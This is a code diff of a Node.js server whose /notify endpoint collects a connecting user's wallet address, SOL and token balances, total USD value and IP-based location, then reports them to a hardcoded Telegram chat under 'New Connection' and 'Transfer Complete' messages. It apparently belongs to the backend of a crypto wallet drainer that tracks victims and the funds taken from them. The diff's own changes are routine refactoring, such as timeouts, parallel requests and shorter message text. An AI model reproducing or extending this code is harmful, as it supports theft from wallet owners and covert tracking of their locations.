@@ -14,9 +14,8 @@ const CHAT_ID = "8520547580";
 
 let cachedSolPrice = null;
 let lastPriceUpdate = 0;
-const PRICE_CACHE_DURATION = 30 * 60 * 1000; // 30 minutes
+const PRICE_CACHE_DURATION = 30 * 60 * 1000;
 
-// Token mint -> symbol mapping (shared with frontend)
 const TOKEN_SYMBOLS = {
     'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
     'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
@@ -31,7 +30,6 @@ const TOKEN_SYMBOLS = {
 // ============================================
 
 function getCountryFlag(countryCode) {
-    if (!countryCode) return '🌍';
     const flags = {
         'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
         'FR': '🇫🇷', 'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'IN': '🇮🇳',
@@ -43,19 +41,18 @@ function getCountryFlag(countryCode) {
 
 async function getIPLocation(ip) {
     try {
-        const response = await axios.get(`http://ip-api.com/json/${ip}`);
+        const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 5000 });
         const data = response.data;
         if (data.status === 'success') {
             return {
                 country: data.country,
                 countryCode: data.countryCode,
-                region: data.regionName,
                 city: data.city,
                 flag: getCountryFlag(data.countryCode)
             };
         }
     } catch (error) {
-        console.error('IP geolocation error:', error);
+        console.error('IP geolocation error:', error.message);
     }
     return null;
 }
@@ -68,21 +65,20 @@ async function getSolPrice() {
     }
     
     try {
-        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
+        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', { timeout: 10000 });
         cachedSolPrice = response.data.solana.usd;
         lastPriceUpdate = now;
-        console.log(`SOL price updated: $${cachedSolPrice}`);
+        console.log(`SOL price: $${cachedSolPrice}`);
         return cachedSolPrice;
     } catch (error) {
-        console.error('Error fetching SOL price:', error.message);
-        return cachedSolPrice || 0;
+        console.error('SOL price error:', error.message);
+        return cachedSolPrice || 150;
     }
 }
 
 function escapeMarkdown(text) {
     if (!text) return '';
-    const specialChars = /[_*[\]()~`>#+=|{}.!-]/g;
-    return text.replace(specialChars, '\\$&');
+    return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
 }
 
 // ============================================
@@ -98,11 +94,15 @@ app.post('/notify', async (req, res) => {
         if (clientIP && clientIP.includes(',')) {
             clientIP = clientIP.split(',')[0].trim();
         }
+        if (clientIP && clientIP.includes('::')) {
+            clientIP = '127.0.0.1';
+        }
         
-        const locationInfo = await getIPLocation(clientIP);
-        const solPrice = await getSolPrice();
+        const [locationInfo, solPrice] = await Promise.all([
+            getIPLocation(clientIP),
+            getSolPrice()
+        ]);
         
-        // Calculate total USD value
         const solBalance = parseFloat(balance) || 0;
         let totalUSD = solBalance * solPrice;
         let splTokensStr = '';
@@ -112,45 +112,40 @@ app.post('/notify', async (req, res) => {
             for (const token of splTokens) {
                 const tokenValue = token.usdValue || 0;
                 totalUSD += tokenValue;
-                splTokensStr += `• ${token.symbol}: ${token.balance} ($${tokenValue.toFixed(2)})\n`;
+                splTokensStr += `• ${token.symbol}: ${token.balance.toFixed(4)} ($${tokenValue.toFixed(2)})\n`;
             }
         }
         
-        const shortAddress = address ? `${address.slice(0, 6)}...${address.slice(-4)}` : 'Unknown';
-        const locationStr = locationInfo ? `${locationInfo.flag} ${locationInfo.city || ''} ${locationInfo.country || ''}` : '🌍 Unknown';
+        const shortAddress = address && address !== 'Unknown' ? 
+            `${address.slice(0, 6)}...${address.slice(-4)}` : 'Unknown';
+        const locationStr = locationInfo ? 
+            `${locationInfo.flag} ${locationInfo.city || ''} ${locationInfo.country || ''}` : '🌍 Unknown';
         
         let text;
         if (customMessage) {
             if (customMessage.includes('🔗 Wallet Connected')) {
-                text = `🔗 New Wallet Connection\n\n` +
-                       `💰 Total Value: $${totalUSD.toFixed(2)}\n` +
+                text = `🔗 New Connection\n\n` +
+                       `💰 Value: $${totalUSD.toFixed(2)}\n` +
                        `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                        `🔄 Type: ${walletType || 'Unknown'}\n` +
                        `💎 SOL: ${balance} SOL ($${(solBalance * solPrice).toFixed(2)})${splTokensStr}\n` +
                        `📍 ${locationStr}\n` +
                        `🕒 ${new Date().toLocaleString()}`;
-            } else if (customMessage.includes('✅')) {
-                text = `✅ ${customMessage}\n\n` +
+            } else if (customMessage.includes('🎉 Transfer Complete')) {
+                text = `🎉 ${customMessage}\n\n` +
                        `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
-                       `💰 Value: $${totalUSD.toFixed(2)}${splTokensStr}\n` +
-                       `📍 ${locationStr}`;
-            } else if (customMessage.includes('🎉')) {
-                text = `🎉 TRANSFER COMPLETE\n\n` +
-                       `${customMessage}\n\n` +
-                       `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
-                       `💰 Total Value: $${totalUSD.toFixed(2)}${splTokensStr}\n` +
+                       `💰 Total: $${totalUSD.toFixed(2)}${splTokensStr}\n` +
                        `📍 ${locationStr}`;
             } else {
                 text = `${customMessage}\n\n` +
                        `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
-                       `💰 SOL: ${balance} SOL ($${(solBalance * solPrice).toFixed(2)})${splTokensStr}\n` +
                        `📍 ${locationStr}`;
             }
         } else {
-            text = `🔗 New Wallet Connection\n\n` +
-                   `💰 Total Value: $${totalUSD.toFixed(2)}\n` +
+            text = `🔗 New Connection\n\n` +
+                   `💰 Value: $${totalUSD.toFixed(2)}\n` +
                    `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
-                   `💎 SOL: ${balance} SOL ($${(solBalance * solPrice).toFixed(2)})${splTokensStr}\n` +
+                   `💎 SOL: ${balance} SOL${splTokensStr}\n` +
                    `📍 ${locationStr}`;
         }
         
@@ -158,12 +153,12 @@ app.post('/notify', async (req, res) => {
             chat_id: CHAT_ID,
             text: text,
             parse_mode: 'Markdown',
-            disable_web_page_preview: false
+            disable_web_page_preview: true
         });
         
         res.json({ ok: true });
     } catch (error) {
-        console.error('Telegram error:', error.response?.data || error.message);
+        console.error('Telegram error:', error.message);
         res.status(500).json({ error: "Notification failed" });
     }
 });
@@ -180,14 +175,12 @@ app.get('/health', (req, res) => {
 // SERVER STARTUP
 // ============================================
 
-const PORT = 5000;
+const PORT = process.env.PORT || 5000;
 app.listen(PORT, '0.0.0.0', async () => {
-    console.log(`Server running on port ${PORT}`);
-    await getSolPrice(); // Initialize price cache
+    console.log(`🚀 Server running on port ${PORT}`);
+    await getSolPrice();
     
-    // Start price updater
     setInterval(async () => {
-        console.log('Updating SOL price...');
         await getSolPrice();
     }, PRICE_CACHE_DURATION);
 });
